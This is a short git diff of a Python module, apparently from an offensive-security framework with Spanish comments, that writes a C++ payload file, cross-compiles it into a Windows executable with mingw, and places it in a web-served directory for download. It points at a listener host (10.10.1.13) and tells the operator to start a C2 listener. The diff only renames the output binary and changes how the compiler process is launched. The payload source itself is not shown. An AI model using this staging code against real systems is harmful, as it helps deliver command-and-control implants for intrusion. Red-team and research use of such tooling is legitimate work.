@@ -53,7 +53,7 @@ class multi_stage_channels(Module):
 		lhost = "10.10.1.13"
 		name = 'ejecutarPSs.cpp'
 		fullname = parent_path+name
-		exename = "envia"
+		exename = "ejecuta"
 		outfile = parent_webroot_path + exename
 
 
@@ -87,8 +87,8 @@ class multi_stage_channels(Module):
 		print("Archivo "+ fullname + " creado.")
 		#i686-w64-mingw32-g++ ejecutarPSs.cpp -o ejecuta -static-libgcc -static-libstdc++
 		args = ["i686-w64-mingw32-g++", fullname, "-o", outfile, "-static-libgcc", "-static-libstdc++"]
-		p = subprocess.Popen(args)
-		p.terminate()
+		print("{} {}".format(fullname, outfile))
+		subprocess.Popen(args)
 		print("Compilado {}".format(outfile))
 		print("Inicia tu listener C2.")
 		#time.sleep(1)
